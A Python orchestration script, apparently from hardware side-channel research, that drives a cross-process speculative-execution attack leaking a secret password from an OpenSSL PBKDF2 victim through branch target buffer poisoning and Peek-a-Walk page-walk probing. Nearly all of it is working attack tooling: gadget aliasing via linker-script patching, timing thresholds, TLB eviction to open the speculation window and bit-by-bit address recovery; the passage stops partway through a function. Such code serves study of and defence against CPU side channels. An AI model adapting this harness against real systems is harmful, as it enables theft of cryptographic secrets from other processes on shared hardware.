#!/usr/bin/env python3
"""
End-to-end cross-process leak of a secret out of an OpenSSL victim.

This is the OpenSSL counterpart of Cross_Process_Demonstration_No_Sched, which
does the same thing against GMP. The mechanism is identical; only the victim's
gadget chain differs.

    BTB variant: this is the BTB-steered port of the IBP demo. The BTB is indexed
    by PC[23:0] only (no PHR), so the entire branch-history apparatus of the IBP
    version -- SHIFT_PHR/SET_PHR and the fake_crypto_*/fake_obj replay chain -- is
    gone. Steering is pure PC[23:0] aliasing.

    victim  : PKCS5_PBKDF2_HMAC(password, -1, ...) -> ... -> strlen@plt.
              strlen@plt is `jmp *strlen@GOT(%rip)` and the victim flushes that
              GOT line, so the jump stalls. The core runs ahead on the BTB entry
              for that branch, which the attacker has trained (via gadget_plt,
              pinned at strlen@plt's address) to point at pkey_fake_import. Its
              `call *(%rax)` then executes speculatively with rax = rdi = password,
              writing *password -- the low 32 bits of the secret -- into the BTB.

    attacker: pins just gadget_plt and gadget at strlen@plt and pkey_fake_import
              (no PHR, no fake chain), so gadget_plt collides with strlen@plt and
              gadget's `call *(%rax)` collides with pkey_fake_import's. It then
              reads that BTB entry back and decodes the speculative target with
              Peek-a-Walk (the high 16 bits come from the reader PC).

The script:
1. Compiles the victim ONCE (its only compile-time input is the secret) and
   leaves a single long-lived victim process running for every attacker run.
2. Re-derives every absolute address in attacker.ld from the freshly built
   victim, because adding or removing a single instruction in victim.nasm
   shifts the whole statically-linked libcrypto image.
3. Runs with get_higher_bits=1 so Peek-a-Walk walks the page tables. leak.c
   decides the PL2 level itself (loop 1, cheap); loop 2 sweeps all 8 vpn2_co
   and only collects.
3b. Scores loop 2's raw dump with spike.py to fix the PL1 level, and merges it
   with leak.c's PL2 result into bits 15-32.
4. Patches .sec_malicious_target and steps it by 64 until the load timing
   confirms the speculative fetch landed there -- bits 6-14.
5. Recompiles with leak_final_6=1 and sweeps num_align 0..63 for the bottom
   6 bits.

Steps 3b/4/5 partition the address exactly: spike fixes bits 15-32, the 512
increments of 64 bytes in step 4 cover bits 6-14, and num_align covers 0-5.
"""

import subprocess
import threading
import argparse
import shutil
import time
import re
import sys
import os

import spike

WORKDIR = os.path.dirname(os.path.abspath(__file__))
LINKER_LD = os.path.join(WORKDIR, "attacker.ld")
ATTACKER_OUT = os.path.join(WORKDIR, "attacker.asm")
VICTIM_OUT = os.path.join(WORKDIR, "victim.asm")
RESULTS_OUT = os.path.join(WORKDIR, "results.out")
PERF_CTS = ""
# Logical core both processes are pinned to. They MUST share one logical core:
# the IBP entry is per-logical-core, so SMT co-residency is not an option.
# Prefer an isolcpus core whose SMT sibling is also isolated -- the sibling
# shares L1D and the page-structure caches with the attack, so arbitrary work on
# it lands directly in the prime+probe measurement. Check with
# `cat /proc/cmdline` and /sys/devices/system/cpu/cpuN/topology/thread_siblings_list.
CORE_ID = 3
MAX_INCREMENTS = 512
ADDR_STEP = 64
NUM_ALIGN_MAX = 63  # inclusive

# A single round whose measured load comes back under this many cycles counts as
# a cache hit, i.e. the speculative fetch landed. The attacker reports one value
# per round, so what matters is the fraction that come back fast, not whether
# any single number is low.
#
# Measured on this machine: hits land at 81-103 cycles, and a wrong address
# never produces anything below 344. 200 sits in the empty gap between the two
# populations.
HIT_CYCLES = 200
# Fraction of rounds that must be hits before an address/alignment is accepted.
# Measured: 88-93% at the correct address/alignment, 0% at a wrong address, and
# 0.2% at a near-miss alignment. 2% clears the background comfortably.
MIN_HIT_RATE = 0.02

# Every attacker section that has to sit exactly on top of a victim symbol, as
# (linker-script section, attacker symbol, victim symbol). The attacker symbol
# is what we read back out of the attacker objdump to confirm the placement
# actually took; the victim symbol is where it has to land.
#
# BTB steering keys on PC[23:0] only -- no PHR -- so the five-deep fake call
# chain that the IBP version used to replay branch history is gone. We only need
# the two aliasing branches pinned on their victim counterparts:
#   gadget_plt (I_speculative) -> strlen@plt      : steers the victim into gadget
#   gadget's call *(%rax) (I_read) -> pkey_fake_import : reads the secret back
# .sec_collision stays pinned to the harness entry so its placement is stable.
LAYOUT = [
    (".sec_collision",              "start_collision",       "start_test_ibranch"),
    (".sec_gadget_plt",             "gadget_plt",            "strlen@plt"),
    (".sec_gadget",                 "gadget",                "pkey_fake_import"),
]

# Offsets the hand-written fake functions in attacker.nasm bake in. They are
# offsets *within* real libcrypto functions, so they survive a rebase of the
# image but not a rebuild of OpenSSL itself. Checked against the victim objdump
# up front so a mismatch is a loud error instead of a silent no-signal run.
# (victim symbol, offset, expected mnemonic prefix, description)
# BTB version: only the two branches that actually carry the attack need to be
# where attacker.nasm expects. The whole PHR-replay chain (and its offset
# asserts into PKCS5_PBKDF2_HMAC / ossl_* / EVP_MD_get0_name / OBJ_nid2*) is gone.
#   strlen@plt+0x00   : the stalled jmp the BTB steers to gadget
#   pkey_fake_import+0x0b : the call *(%rax) gadget mirrors and whose BTB entry
#                           the victim overwrites with the secret
CHAIN_ASSERTS = [
    ("strlen@plt",                0x00, "jmp",   "jmp *strlen@GOT -- the stalled branch"),
    ("pkey_fake_import",          0x0b, "call",  "call *(%rax) -- writes the secret"),
]


def run_cmd(cmd, capture_stderr=False):
    print(f"[CMD] {' '.join(cmd)}")
    result = subprocess.run(
        cmd,
        cwd=WORKDIR,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )
    if result.returncode != 0:
        print(f"[STDERR] {result.stderr}")
        print(f"[STDOUT] {result.stdout}")
    return result


# The victim never cooperates: there is no shared token and no handoff it takes
# part in. The attacker hands the core over by blocking in nanosleep for
# SLEEP_NS, which takes it off the runqueue and leaves the victim as the only
# runnable task pinned to the core. Both binaries are built with
# -Duse_spinlocks=0; the assembly still carries the unreachable cooperative
# paths behind %if use_spinlocks, but nothing here can select them.
#
# This is the configuration every confirmed recovery was measured with,
# discovery phase included.
# ATTACKER_HANDOFF block length. This is the single most important knob in the
# no-cooperation mode. For the direct-strlen victim (strlen(password) called
# explicitly as the carrier, not via PBKDF2's passlen=-1) the hit rate climbs
# through a window-opening knee and then sits on a noisy plateau rather than a
# sharp peak -- measured on core 0 (3 runs x 100 rounds/point): 0.7% at 2ms,
# 7.0% at 8ms, 27.7% at 12ms, 38.3% at 16ms, 45.0% at 20ms, then a choppy
# ~25-46% band out to 48ms (45.7%) and down again. 20ms matches the peak hit
# rate at less than half the handoff of 48ms, so it is the default. The plateau
# tops out ~45% (vs the old nested victim's ~93%) because PBKDF2 still runs AFTER
# the write each round and ages the entry; reducing victim_calls / pbkdf2_iters
# is the lever for a stronger signal. Re-tune (scratch sleep_sweep.py) if the
# machine or the victim's per-round work changes.
SLEEP_NS = 48_000_000
TRAIN_COUNT = 100        # start_collision calls per round; installs E1
NUM_ROUNDS = 100         # total measured rounds per run

# Handoff model. USE_SPINLOCKS=0 is the shipped sleep-based (no-cooperation)
# handoff where the attacker opens the strlen@GOT window by TLB-evicting during
# its nanosleep. USE_SPINLOCKS=1 switches both processes to strict shared-memory
# turn-taking: no sleep, so the attacker no longer evicts the GOT TLB, and the
# victim must open its own window -- pair it with GOT_STALL=3 (victim clflushes
# its own strlen@GOT). Used to test whether scheduler noise in the sleep handoff
# is what churns the BTB poison.
USE_SPINLOCKS = 0
GOT_STALL = 0

# Fixed, not a knob. 10000 is OpenSSL's realistic iteration count and the only
# value any confirmed recovery used. Lowering it shortens the victim's
# gadget-to-gadget latency, which makes the attack look far easier than it is
# against a real victim, so it is not exposed on the command line.
PBKDF2_ITERS = 10000

# Minimal-churn BTB knobs (diagnostic). pbkdf2_iters=1 removes the ~10k HMAC
# iterations that run AFTER strlen@plt and churn the freshly-written E2 BTB
# entry before the attacker reads it; victim_calls=1 makes the victim do a
# single gadget call per turn and hand straight back. Both shrink what sits
# between the speculative BTB write and the readback. Exposed so we can test
# whether the real victim's churn (not the BTB itself) is what kills the signal.
VICTIM_CALLS = 5    # paired with the direct-gadget readback

# Mispredict-diagnostic knobs. When MEASURE_MISP=1 the victim is built from the
# BOUNDED printing template (so it emits its PMC table) with READ_PMC around its
# gadget call(s), accumulating BR_MISP_RETIRED.INDIRECT (ctr 206). VICTIM_REPEAT0
# rows x VICTIM_REPEAT1 rounds; keep the product <= the attacker's num_rounds so
# the victim finishes (and prints) first.
MEASURE_MISP = 0
VICTIM_TEMPLATE = "../../TemplateB64_infinite_openssl.nasm"
VICTIM_MEASURE_TEMPLATE = "../../TemplateB64_measure_openssl.nasm"
VICTIM_REPEAT0 = 10
VICTIM_REPEAT1 = 50
# How the speculation window is opened is NOT configurable. The victim does not
# flush its own GOT (got_stall=0) and the attacker opens the window itself by
# subdividing its handoff sleep and evicting the dTLB before each slice
# (got_flush_slices=24). Both values are hard-coded at the nasm command lines
# below -- and are also the defaults in victim.nasm / attacker.nasm, so the
# run_p*.sh scripts build the same binaries -- so that a run log still records
# them. They are a matched pair and neither is meaningful alone:
#
#   * got_stall=0 on its own is no window at all and the channel is dead, NOT
#     merely weak. The three alternatives victim.nasm still implements are the
#     controls that result is argued against: 3 = clflush (~300cy), the
#     configuration every confirmed recovery through 2026-08-27 used; 1 evicts
#     only the L1D set (~15cy); 2 is dTLB control. 1 and 2 were tried while
#     testing whether an SMT-sibling attacker could open the window without
#     physical addresses, and neither survives to an end-to-end leak -- the
#     stall turns out to be a TLB effect, and the dTLB is not shared across
#     siblings.
#
#   * Dropping the victim's self-flush is the point of this configuration. It
#     was the weakest assumption in the threat model: a real victim does not
#     flush its own GOT to open a speculation window, and the attacker cannot
#     flush it either (.got is inside GNU_RELRO, a private COW page, so the
#     attacker's clflush lands on a different physical line). Victim and
#     attacker do share one core and therefore one dTLB, which is what
#     got_flush_slices exploits.
#
#   * got_stall=0 is also the one variant that leaves the victim image
#     byte-identical: the clflush is replaced by exactly 7 NOPs, so attacker.ld
#     does not need repatching (the other levels do shift it; see
#     objdump_and_verify).
#
# Two more values are fixed for the same reason and are likewise hard-coded at
# the nasm lines below:
#
#   * got_flush_pages=64 -- pages TLB_EVICT touches per pass, out of the
#     attacker's own tlb_evict_buf. It is the other half of the mechanism that
#     replaced the victim's clflush, so it is not independently meaningful.
#     TLB_EVICT is branch-free and fully unrolled (a loop would push taken
#     branches into the PHR that start_collision depends on), so
#     got_flush_pages x got_flush_slices is a literal instruction count -- 64 x
#     24 loads per handoff -- and the buffer is sized from it at assembly time.
#
#   * victim_yield=0 -- the victim issues no sched_yield() at its two handoff
#     points, so it offers the attacker no scheduling cooperation whatsoever
#     and simply loops calling PBKDF2. This is a threat-model claim, not a
#     tuning knob; the attacker gets the core only because it blocks in
#     nanosleep. VICTIM_ACQUIRE/VICTIM_RELEASE pad to a fixed byte budget
#     either way, so the victim image does not move when it changes.

# Peek-a-Walk (get_higher_bits=1) knobs. Every setup/trigger pair blocks for a
# victim gadget call, and one profile_cache call is
# PWSC_TRIALS x 64 lines x 10 rounds x 2 phases of them. Measured against the
# shipped victim: ~16 rows/s, ~1.3 h per profile_cache, ~4 h per
# find_level0_line, and a full decode needs at least two of those. The PBKDF2
# latency dominates, so no handoff scheme changes this.
#
# PWSC_TRIALS and PWSC_THRESHOLD must be chosen together, but NOT because the
# solver scales one by the other -- it does not, and that is a wart worth
# knowing about. pwsc_init_reset does
#     solver_gap_threshold = input_solver_gap_threshold * nrounds
# and nothing else, while the gap it is compared against is a sum over
# rounds x trials x attempts. So the same nominal threshold is twice as strict
# at 60 trials as at 120, and three times as strict at 1 attempt as at 3.
# Raising attempts silently loosens the rule; raising trials silently tightens
# it relative to the signal it is measuring. Re-derive the threshold from data
# whenever either moves. pwsc.h ships 128/55 and 16/4 as its two calibrated
# pairings; 120/15 is what the no-clflush configuration was calibrated to.
PWSC_TRIALS = 120
# 15 (printed gap 150), lowered from 25 (gap 250) when the victim's clflush was
# dropped. Removing it costs ~7.6x of loop 1's gap on the same secret (1753 with
# clflush at 120 trials, 232 without), so 250 rejected correct answers.
#
# 150 is not fitted to a known answer -- it sits in an empty band. Scored across
# every loop-1 profile in the archive with the self-image mask applied as leak.c
# applies it (noise_filter[i] * nrounds subtracted from EVERY trial, so a masked
# line is removed outright, not nudged):
#
#     null / wrong-co profiles   gaps 0 3 9 11 14 16 20 23 26 29 35   max  35
#     true-line profiles         gaps 132 153 200 ... 1753 1791       min 132
#
#     thr 250: correct 6, wrong 0, no-answer 6
#     thr 150: correct 8, wrong 0, no-answer 4   <- rescues the no-clflush run
#     thr 100: correct 9, wrong 0, no-answer 3
#
# The loudest null is 35 and the quietest true signal is 132, so 150 keeps ~4x
# headroom above noise and ~1.5x below the weakest real signal. Note the noise
# floor grows as sqrt(trials) while signal grows linearly, so this band widens
# with more trials -- 150 stays safe at 240, but re-derive it before going below
# 120, where the projected no-clflush gap is only ~68 against a null ceiling
# of 29.
#
# This threshold gates LOOP 1 ONLY. Loop 2's in-process accept is advisory;
# spike.py scores its raw dump at step 1b and is the authority on PL1.
PWSC_THRESHOLD = 15

# Attempts per co, per loop. The two loops solve different problems now:
#
#   Loop 1 (PL2) still decides in-process, using leak.c's self-image mask plus
#   the solver's gap rule. That decision is not close -- on run_45678213_v2 the
#   true line 5 was rank 1 in every attempt at a 33x margin -- so 3 attempts is
#   ample, and the saving is what pays for loop 2.
#
#   Loop 2 (PL1) decides nothing in-process. It sweeps all 8 vpn2_co and leaves
#   a raw dump, which spike.py scores afterwards. 9 attempts is what makes that
#   dump worth scoring: signal grows linearly in attempts while the noise peak
#   grows as sqrt.
#
# See PWSC_ATTEMPTS_L1_DEFAULT / PWSC_ATTEMPTS_L2_DEFAULT in leak.c, which hold
# the same values; these are passed explicitly so a run log records them.
PWSC_ATTEMPTS_L1 = 1
PWSC_ATTEMPTS_L2 = 1

# PL1 eviction set size, in entries of the 4 KiB-stride walk.
#
# pwsc.h compiles in MEMORY_MAP_ORDER_ORACLE_EVICT_SIZES = {4096, 64, 32, 12}.
# At 4096 the PL1 signature is starved and loop 2 rejects every co.
#
# Mechanism is STLB/PWC capacity, NOT cache eviction: evict_page_caches touches
# one line per page, so 4096 pages is 4096 lines = 256 KiB of cache footprint --
# far too little to evict anything from a 36 MiB L3. 4096 pages does exceed a
# ~2048-entry STLB, while 512 does not. (An earlier comment claimed a "16 MiB
# walk" sweeping the PTE out to DRAM; that arithmetic is wrong.)
#
# Both confirmed recoveries (0x12345678 and 0xdeadbeef) and
# all 20 discovery logs in the working tree ran with this overridden to 512;
# see the "PWSC_EVICT_PL1: PWC evict PL1 (stride 4096 B) 4096 -> 512" banner in
# reference_data/*/loop1.log. It was exported in the shell there, so it did not
# travel with the scripts; it is set here so the artifact is self-contained.
PWSC_EVICT_PL1 = 512

_victim_compiled = False


def _compile_pmctest():
    r = run_cmd([
        "g++", "-O2", "-c", "-m64", "-oa64.o", "../../PMCTestA_pid.cpp"
    ])
    if r.returncode != 0:
        raise RuntimeError("g++ compile PMCTestA_pid.cpp failed")


def _strlen_got_page_offset():
    """Page offset of the GOT slot strlen@plt jumps through, read from x_victim.

    UNUSED in the shipped pipeline: it existed to aim got_stall=1/2's eviction
    at the right L1D set, and got_stall is now hard-coded to 0. Kept because
    victim.nasm still implements those levels as controls and they cannot be
    rebuilt without it -- the offset moves whenever the victim image changes.

    `objdump -d` renders the PLT stub as
        jmp *0x330f2a(%rip)        # 7340d0 <strlen@GLIBC_2.2.5>
    so the resolved target is in the trailing comment.
    """
    r = run_cmd(["objdump", "-d", "x_victim"])
    if r.returncode != 0:
        raise RuntimeError("objdump x_victim failed")
    lines = r.stdout.splitlines()
    for i, ln in enumerate(lines):
        if "<strlen@plt>:" in ln:
            for probe in lines[i + 1:i + 4]:
                m = re.search(r"jmp\s+\*0x[0-9a-f]+\(%rip\)\s*#\s*([0-9a-f]+)",
                              probe)
                if m:
                    return int(m.group(1), 16) & 0xFFF
    raise RuntimeError("could not find strlen@plt's GOT target in x_victim")


def compile_victim(secret_value):
    """Compiles x_victim EXACTLY ONCE for the whole run.

    The victim's only compile-time dependency is secret_value (it becomes the
    `password` qword the speculative `call *(%rax)` resolves to), and
    secret_value is fixed for the entire script. Once it is built here the
    binary must never be rebuilt: every libcrypto address baked into
    attacker.ld is derived from it, and the running victim process has to stay
    stable while only the attacker is recompiled and swept.
    """
    global _victim_compiled
    if _victim_compiled:
        # Guard: the victim must not be rebuilt after the secret is set.
        return

    _compile_pmctest()

    # got_line_offset only selects the L1D set for got_stall=1/2; at the shipped
    # got_stall=0 it is inert, and is passed as 0 so the build line is explicit.
    victim_nasm = [
        "nasm", "-f", "elf64", "-o", "b64.o", "-i../..",
        f"-Dcounters={PERF_CTS}",
        f"-Dsecret_value={secret_value}",
        f"-Duse_spinlocks={USE_SPINLOCKS}",
        f"-Dpbkdf2_iters={PBKDF2_ITERS}",
        f"-Dvictim_calls={VICTIM_CALLS}",
        f"-Dgot_stall={GOT_STALL}",
        "-Dvictim_yield=0",
        "-Dgot_line_offset=0",
        f"-Dmeasure_misp={1 if MEASURE_MISP else 0}",
    ]
    if MEASURE_MISP:
        victim_nasm += [f"-Drepeat0={VICTIM_REPEAT0}", f"-Drepeat1={VICTIM_REPEAT1}"]
    victim_nasm += [
        "-Pvictim.nasm",
        VICTIM_MEASURE_TEMPLATE if MEASURE_MISP else VICTIM_TEMPLATE,
    ]
    r = run_cmd(victim_nasm)
    if r.returncode != 0:
        raise RuntimeError("nasm compile victim failed")
    r = run_cmd([
        "g++", "-no-pie", "-flto", "-m64",
        "a64.o", "b64.o", "./openssl-3.5.0/libcrypto.a",
        "-ox_victim", "-lpthread", "-lrt",
    ])
    if r.returncode != 0:
        raise RuntimeError("g++ link victim failed")

    _victim_compiled = True
    print("[INFO] Victim compiled once; it will not be rebuilt for the rest of the run.")


def compile_attacker(collision, secret_value, leak_final_6=0, num_align=0):
    """Compiles x_attacker. Called repeatedly during the address search and the
    num_align sweep. Never touches x_victim."""
    _compile_pmctest()

    r = run_cmd([
        "nasm", "-f", "elf64", "-o", "b64.o", "-i../..",
        f"-Dcounters={PERF_CTS}",
        f"-Dget_higher_bits={collision}",
        f"-Dsecret_value={secret_value}",
        f"-Dleak_final_6={leak_final_6}",
        f"-Dnum_align={num_align}",
        f"-Duse_spinlocks={USE_SPINLOCKS}",
        # Force per-round measurement regardless of handoff: the attacker template
        # defaults per_round=(1-use_spinlocks), so use_spinlocks=1 would SUM all
        # rounds into one value and defeat the <200-cycle per-round hit counter.
        "-Dper_round=1",
        f"-Dsleep_ns={SLEEP_NS}",
        "-Dgot_flush_slices=24",
        "-Dgot_flush_pages=64",
        f"-Dtrain_count={TRAIN_COUNT}",
        f"-Dnum_rounds={NUM_ROUNDS}",
        f"-Dpwsc_trials={PWSC_TRIALS}",
        f"-Dpwsc_threshold={PWSC_THRESHOLD}",
        "-Pattacker.nasm",
        "../../TemplateB64_openssl_cross.nasm",
    ])
    if r.returncode != 0:
        raise RuntimeError("nasm compile attacker failed")

    r = run_cmd([
        "g++", "-no-pie", "-flto", "-m64",
        "a64.o", "b64.o", "./Peek-a-Walk-Modified/pwsc_library/build/pwsc.a",
        "-ox_attacker", "-T", "attacker.ld", "-lpthread", "-lrt",
    ])
    if r.returncode != 0:
        raise RuntimeError("g++ link attacker failed")


def read_linker_ld():
    with open(LINKER_LD, "r") as f:
        return f.read()


def write_linker_ld(content):
    with open(LINKER_LD, "w") as f:
        f.write(content)


def set_section_addr(section, addr):
    content = read_linker_ld()
    new_content, n = re.subn(
        rf"(\{section}\s+)0x[0-9a-fA-F]+",
        lambda m: m.group(1) + hex(addr),
        content,
    )
    if n == 0:
        raise RuntimeError(f"{section} address pattern not found in attacker.ld")
    write_linker_ld(new_content)
    print(f"[INFO] Set {section} to {hex(addr)}")


# .sec_malicious_target contains `jmp align_target`, a rel32 that cannot span
# more than 2 GiB. The target address is dictated by the secret, so align_target
# is what has to move. Keeping it a fixed 1 MiB above the target satisfies the
# jump for every secret, and -- because it is a real PT_LOAD -- keeps it in the
# same PDPT entry as the target, so it never populates a second PDPT entry
# behind loop 1's vpn3_co search (see the PARK_ADDR note below).
ALIGN_TARGET_OFFSET = 0x100000


def set_malicious_target_addr(addr):
    set_section_addr(".sec_malicious_target", addr)
    set_section_addr(".align_target", addr + ALIGN_TARGET_OFFSET)


# Where .sec_malicious_target is parked while Peek-a-Walk runs. Anywhere that
# shares no page-walk cache line with a plausible secret will do; this sits well
# clear of both the OpenSSL image and the attacker's own sections.
#
# MUST STAY BELOW 1 GiB (PDPT entry 0). The park section is a real PT_LOAD -- it
# is the only loaded segment the attacker has outside its own image -- so it
# populates whichever PDPT entry it lands in. Parked at 0x7A000640 it populated
# PDPT[1], and loop 1 of leak_inst_addr_ind searches vpn3_co by mmap'ing
# (co << 30) and asking whether the speculative walk now reaches PL2. With
# PDPT[1] already present that search is defeated: a secret in the second GiB
# (e.g. 0x45678213, true vpn3_co=1) produced a PL2 hit at co=0 with nothing
# mapped, so loop 1 broke immediately and stamped vpn3_co=0 into the result --
# a decoded base short by exactly 1<<30. 0x12345678 masked this because its
# vpn3_co is genuinely 0.
#
# Keeping the park in PDPT[0], alongside the image, leaves PDPT[1..3] empty at
# startup so co=0 fails for a second-GiB secret and co=1 is what makes the walk
# reach PL2. Verified nothing else reaches those entries: the 38 MB RW segment
# ends at 0x24389C8, brk follows it, and runtime mmaps land near 0x7f...
#
# The low 30 bits are unchanged from the validated values, so the PD index (464)
# and hence the PL2 line (58) are identical -- line 58 measured -0.24/trial in
# two runs, i.e. it creates no artifact where it sits. Do not "simplify" these
# to rounder numbers without re-checking (addr >> 24) & 0x3f.
PARK_ADDR = 0x3A000640      # PDPT[0], PD idx 464, PL2 line 58
# Used only if --secret_value lands in PARK_ADDR's own 2 MiB region.
PARK_ADDR_ALT = 0x2B000640  # PDPT[0], PD idx 344, PL2 line 43


def reset_malicious_target(secret_value):
    """Unconditionally restores .sec_malicious_target to the park address.

    Called once at startup, before anything is compiled, so that every run
    begins from an identical linker script no matter how the previous one
    ended.

    Step 2 rewrites the ld file in place as it steps the address by 64, and
    nothing writes it back afterwards -- so a re-run would otherwise start
    discovery with the section parked on whatever the last run stopped at, very
    often the answer itself. That is the worst possible starting state:
    Peek-a-Walk detects the secret by the page-walk cache lines its speculative
    fetch touches, and .sec_malicious_target is a linked, loaded section, so if
    it sits on the secret's page the attacker already has that translation
    mapped and resident and the walk it is trying to observe never happens --
    the correct line goes dead. leak_inst_addr_ind also probes candidates with
    MAP_FIXED_NOREPLACE, which then fails EEXIST; leak.c checks `if
    (!va_buffer)`, which does not catch MAP_FAILED, so that failure is silent.

    Resetting at launch rather than at exit is deliberate: it also cleans up
    after a run that was killed, timed out, or crashed mid-search.

    Returns the address the section was parked at.
    """
    park = PARK_ADDR
    # Same 2 MiB region => same PL2 line, which is the level find_level0_line
    # resolves. A --secret_value inside the park region would make the park
    # address itself the problem, so fall back in that case.
    if (park >> 21) == (secret_value >> 21):
        park = PARK_ADDR_ALT
        print(f"[INFO] Park address {hex(PARK_ADDR)} shares a 2MiB region with "
              f"secret {hex(secret_value)}; using {hex(park)} instead.")

    current = get_current_malicious_target_addr()
    if current == park:
        print(f"[INFO] .sec_malicious_target already at the park address "
              f"{hex(park)}")
        return park

    print(f"[INFO] Resetting .sec_malicious_target {hex(current)} -> "
          f"{hex(park)} (stale value left by a previous run)")
    set_malicious_target_addr(park)
    return park


def get_current_malicious_target_addr():
    content = read_linker_ld()
    m = re.search(r"\.sec_malicious_target\s+(0x[0-9a-fA-F]+)", content)
    if m:
        return int(m.group(1), 16)
    raise RuntimeError(".sec_malicious_target address not found in attacker.ld")


_FN_PATTERN = re.compile(r"^([0-9a-f]+)\s+<([^>]+)>:")


def _parse_symbols(path, wanted):
    """Returns {symbol: address} for the first definition of each wanted symbol."""
    found = {}
    wanted = set(wanted)
    with open(path, "r") as f:
        for line in f:
            m = _FN_PATTERN.match(line)
            if not m:
                continue
            name = m.group(2)
            if name in wanted and name not in found:
                found[name] = int(m.group(1), 16)
                if len(found) == len(wanted):
                    break
    return found


def _parse_insns(path, symbols):
    """Returns {symbol: {offset: mnemonic}} for the given symbols' bodies."""
    bodies = {s: {} for s in symbols}
    bases = _parse_symbols(path, symbols)
    by_addr = {addr: sym for sym, addr in bases.items()}
    cur = None
    insn = re.compile(r"^\s+([0-9a-f]+):\t(?:[0-9a-f]{2} )+\s*\t(\S+)")
    with open(path, "r") as f:
        for line in f:
            m = _FN_PATTERN.match(line)
            if m:
                cur = by_addr.get(int(m.group(1), 16))
                continue
            if cur is None:
                continue
            mi = insn.match(line)
            if mi:
                bodies[cur][int(mi.group(1), 16) - bases[cur]] = mi.group(2)
    return bases, bodies


def _run_objdump():
    print("[INFO] Running objdump to verify function layout...")
    with open(ATTACKER_OUT, "w") as f:
        r = subprocess.run(
            ["objdump", "-d", "./x_attacker"],
            cwd=WORKDIR,
            stdout=f,
            stderr=subprocess.DEVNULL,
            text=True,
        )
    if r.returncode != 0:
        raise RuntimeError("objdump of x_attacker failed")

    with open(VICTIM_OUT, "w") as f:
        r = subprocess.run(
            ["objdump", "-d", "./x_victim"],
            cwd=WORKDIR,
            stdout=f,
            stderr=subprocess.DEVNULL,
            text=True,
        )
    if r.returncode != 0:
        raise RuntimeError("objdump of x_victim failed")


def verify_victim_chain():
    """Checks that the offsets attacker.nasm hard-codes still describe the
    victim's real gadget chain. Runs once, right after the victim is built."""
    print("=" * 60)
    print("Verifying the victim's OpenSSL gadget chain")
    print("=" * 60)

    wanted = sorted({v for _, _, v in LAYOUT} | {s for s, *_ in CHAIN_ASSERTS})
    bases, bodies = _parse_insns(VICTIM_OUT, wanted)

    missing = [s for s in wanted if s not in bases]
    if missing:
        raise RuntimeError(f"Symbols not found in the victim objdump: {missing}")

    for sym in wanted:
        print(f"[INFO] {sym:<28} @ {hex(bases[sym])}")

    problems = []
    for sym, off, mnemonic, what in CHAIN_ASSERTS:
        actual = bodies[sym].get(off)
        if actual is None:
            problems.append(f"{sym}+{hex(off)}: no instruction starts here (want {what})")
        elif not actual.startswith(mnemonic):
            problems.append(
                f"{sym}+{hex(off)}: found '{actual}', expected '{mnemonic}' ({what})"
            )
    if problems:
        raise RuntimeError(
            "The victim's gadget chain does not match what attacker.nasm mirrors:\n  "
            + "\n  ".join(problems)
            + "\nRebuild OpenSSL or re-derive the offsets in attacker.nasm."
        )
    print(f"[OK]  All {len(CHAIN_ASSERTS)} chain offsets match attacker.nasm")


def objdump_and_verify(collision, secret_value, leak_final_6=0, num_align=0,
                       max_fix_attempts=5):
    """
    Dumps both binaries and checks that every attacker section in LAYOUT sits
    exactly on its victim counterpart. If not, patches attacker.ld, recompiles
    the attacker, and retries. Raises RuntimeError only if unfixable.
    """
    for attempt in range(1, max_fix_attempts + 1):
        _run_objdump()

        victim_syms = _parse_symbols(VICTIM_OUT, [v for _, _, v in LAYOUT])
        attacker_syms = _parse_symbols(ATTACKER_OUT, [a for _, a, _ in LAYOUT])

        mismatched = []
        for section, att_sym, vic_sym in LAYOUT:
            if vic_sym not in victim_syms:
                raise RuntimeError(f"Could not find {vic_sym} in the victim objdump")
            if att_sym not in attacker_syms:
                raise RuntimeError(f"Could not find {att_sym} in the attacker objdump")
            want = victim_syms[vic_sym]
            have = attacker_syms[att_sym]
            status = "OK " if want == have else "BAD"
            print(f"[{status}] {att_sym:<22} @ {hex(have):<12} "
                  f"{vic_sym:<28} @ {hex(want)}")
            if want != have:
                mismatched.append((section, want))

        if not mismatched:
            print("[OK]  Layout check passed: every fake function shadows its victim")
            return

        print(f"[WARN] {len(mismatched)} section(s) misplaced "
              f"(attempt {attempt}/{max_fix_attempts}). Patching attacker.ld...")
        for section, want in mismatched:
            set_section_addr(section, want)
        compile_attacker(collision, secret_value,
                         leak_final_6=leak_final_6, num_align=num_align)

    raise RuntimeError(
        f"Could not fix the attacker layout after {max_fix_attempts} attempts."
    )


victim_proc = None


def kill_victim():
    """Kills the currently running x_victim process, if any."""
    global victim_proc
    if victim_proc is None:
        return
    if victim_proc.poll() is None:
        print(f"[INFO] Killing x_victim (pid {victim_proc.pid})")
        victim_proc.terminate()
        try:
            victim_proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            victim_proc.kill()
            victim_proc.wait()
    victim_proc = None


def start_victim():
    """Launches x_victim only if it is not already running.

    The victim binary is compiled once (fixed secret) and never rebuilt, so a
    single long-lived victim process is reused across every attacker run instead
    of being killed and relaunched each time.
    """
    global victim_proc
    if victim_proc is not None and victim_proc.poll() is None:
        return  # Already running the (unchanged) victim; reuse it.
    print(f"[CMD] taskset -c {CORE_ID} ./x_victim")
    victim_proc = subprocess.Popen(["taskset", "-c", str(CORE_ID), "./x_victim"],
                                   cwd=WORKDIR, text=True)


def run_binary(extra_env=None):
    """Runs x_victim (infinitely-looping) then x_attacker, printing stdout+stderr
    live to terminal and appending to results.out. Leaves x_victim running for
    reuse by subsequent calls; the caller is responsible for killing it at the
    end of the script via kill_victim().

    `extra_env` is merged over os.environ for the attacker only. The discovery
    run uses it for PWSC_RAW_DUMP and the per-loop attempt counts; the address
    search and num_align sweep pass nothing, so they never write a dump."""
    start_victim()
    env = None
    if extra_env:
        env = dict(os.environ)
        env.update({k: str(v) for k, v in extra_env.items()})
        print("[CMD] env " + " ".join(f"{k}={v}" for k, v in extra_env.items()))
    print(f"[CMD] taskset -c {CORE_ID} ./x_attacker")
    proc = subprocess.Popen(
        ["taskset", "-c", str(CORE_ID), "./x_attacker"],
        cwd=WORKDIR,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        env=env,
    )
    stdout_lines = []
    stderr_lines = []

    def drain(stream, lines, prefix, log_file):
        for line in stream:
            print(f"{prefix}{line}", end="")
            log_file.write(f"{prefix}{line}")
            log_file.flush()
            lines.append(line)

    with open(RESULTS_OUT, "a") as log:
